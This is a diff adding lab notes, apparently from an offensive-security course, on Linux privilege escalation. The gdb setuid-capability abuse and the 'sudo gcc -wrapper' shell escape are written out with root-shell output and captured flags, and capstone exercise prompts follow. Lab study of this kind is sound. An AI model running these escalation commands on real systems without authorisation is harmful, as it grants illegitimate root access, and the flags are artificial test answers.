@@ -134,3 +134,82 @@ ls
 cat flag.txt
 	OS{86d5ee4209a4acf3b68489772581026d}
 ```
+
+
+# Insecure System Components
+
+## Setuid Capabilities
+```bash
+# Find binary with setuid capability enabled
+/usr/sbin/getcap -r / 2>/dev/null | grep setuid
+	/usr/bin/gdb = cap_setuid+ep
+```
+
+- Find exploit
+![](gtfobins_gdbcapabilities.png)
+
+```bash
+# Abuse
+/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+	GNU gdb (Debian 8.2.1-2+b3) 8.2.1
+	Copyright (C) 2018 Free Software Foundation, Inc.
+	...
+	For help, type "help".
+	Type "apropos word" to search for commands related to "word".
+	# ls
+		Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+	# find / -name flag.txt 2>/dev/null
+		/root/flag.txt
+	# cat /root/flag.txt
+		OS{e534f504e872c3af83048a6676aec75c}
+```
+
+
+## Sudo
+
+2. Connect to VM 2 and gain a root shell by abusing a _sudo_ misconfiguration.
+```bash
+# Get list of sudo cmds available
+sudo -l
+	[sudo] password for joe: 
+	Matching Defaults entries for joe on debian-privesc:
+	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+	
+	User joe may run the following commands on debian-privesc:
+	    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/gcc
+```
+
+- Research exploit from GTFObins
+![](gtfobins_gccsudo.png)
+
+- Abuse
+```bash
+sudo gcc -wrapper /bin/sh,-s .
+	# id
+		uid=0(root) gid=0(root) groups=0(root)
+	# cat /root/flag.txt
+		OS{dab4c20b044f5dfa647824f1ff181a2f}
+```
+
+
+## Kernel Vulns
+
+2. **Capstone Exercise**: Connect to VM 2 with the provided credentials and gain a root shell by abusing a different kernel vulnerability.
+
+
+
+
+
+
+3. **Capstone Exercise**: Connect to the VM 3 with the provided credentials and use an appropriate privilege escalation technique to gain a root shell and read the flag.
+
+
+
+
+
+4. **Capstone Exercise**: On the Module Exercise VM 4, use another appropriate privilege escalation technique to gain access to root and read the flag. Take a closer look at file permissions.
+
+
+
+
+5. **Capstone Exercise**: Again, use an appropriate privilege escalation technique to gain access to root and read the flag on the Module Exercise VM 5. Binary flags and custom shell are what to look for.
